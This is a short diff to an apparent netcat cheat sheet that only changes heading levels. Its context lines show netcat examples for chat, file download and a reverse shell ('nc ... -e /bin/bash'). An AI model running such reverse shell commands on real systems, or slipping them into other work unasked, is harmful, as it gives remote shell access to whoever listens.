@@ -1,4 +1,4 @@
-#bash(chat)
+## bash(chat)
 ```
 # server
 nc -lvp 8888
@@ -7,7 +7,7 @@ nc -lvp 8888
 nc 127.0.0.1 8888
 ```
 
-#bash(reverse_shell)
+## bash(reverse_shell)
 ```
 # server
 nc -lvp 8888
@@ -16,7 +16,7 @@ nc -lvp 8888
 nc 127.0.0.1 8888 -e /bin/bash
 ```
 
-#bash(file_download)
+## bash(file_download)
 ```
 # server
 nc -lvp 8888 > /tmp/output.txt
